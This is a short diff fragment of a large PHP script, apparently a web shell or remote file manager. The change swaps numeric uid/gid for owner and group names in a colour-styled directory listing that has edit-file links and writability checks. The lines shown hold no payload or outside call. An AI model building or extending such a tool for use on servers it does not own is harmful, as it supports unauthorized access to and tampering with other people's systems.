@@ -1374,7 +1374,7 @@ if (isset($_GET['nulz'])) {
                         echo "<td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href=\"?path=$path/$dir\">$dir</a></td>";
                         echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</center></td>";
                         echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
-                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $uid . "/" . $gid . "</center></td>";
+                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $user . "/" . $group . "</center></td>";
                         echo "<td class='whitespace-nowrap'><center>";
                         if (is_writable("$path/$dir"))
                             echo '<center><font class="' . $txtGreen . '">';
@@ -1409,7 +1409,7 @@ if (isset($_GET['nulz'])) {
                         echo "<td class='whitespace-nowrap flex flex-row'><img src='".$filesIcon."'>&nbsp;<a class=\"$txtWhite\" href=\"?option&path=$path/&editfile=$file\">$file</a></td>";
                         echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>" . date("d-M-Y H:i", filemtime("$path/$file")) . "</center></td>";
                         echo "<td class='whitespace-nowrap " . $txtRose . "'><center>" . $size . "</center></td>";
-                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $uid . "/" . $gid . "</center></td>";
+                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $user . "/" . $group . "</center></td>";
                         echo "<td class='whitespace-nowrap'><center>";
                         if (is_writable("$path/$file"))
                             echo '<font class="' . $txtGreen . '">';
